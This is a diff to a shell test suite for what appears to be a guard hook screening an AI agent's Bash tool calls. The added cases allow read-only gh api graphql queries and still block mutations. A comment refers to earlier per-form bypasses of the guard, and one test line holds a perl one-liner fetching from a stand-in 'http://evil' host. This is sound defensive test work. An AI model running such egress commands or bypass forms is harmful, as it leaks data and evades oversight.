@@ -127,6 +127,14 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -Ic'"'
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/issues -ftitle=x"}}'                              "blocks a glued short field flag gh api -ftitle=x (#121)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r/contents -Fkey=@file"}}'                          "blocks a glued short field flag gh api -Fkey=@file (#121)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api /repos/o/r"}}'                                              "allows a gh api read (GET, no write flag)"
+# #111: `gh api graphql -f query=...` is always POSTed at the HTTP layer even for a read, so the
+# generic "field flag implies POST" heuristic can't tell a query from a mutation by argv shape
+# alone — only the query body's `mutation` keyword can.
+assert_exit 0 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql -f query='query{viewer{login}}'\"}}"        "allows a gh api graphql read query via -f query= (#111)"
+assert_exit 0 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql -f query='{viewer{login}}'\"}}"             "allows a gh api graphql unlabeled (anonymous) read query (#111)"
+assert_exit 2 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql -f query='mutation{addComment(input:{})}'\"}}" "still blocks a real gh api graphql mutation via -f query= (#111)"
+assert_exit 2 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql --field query='mutation{addComment(input:{})}'\"}}" "still blocks a gh api graphql mutation via the long --field form (#111)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -X POST -f query='"'"'query{viewer{login}}'"'"'"}}'    "an explicit -X on graphql is NOT carved out — still blocks (#111)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
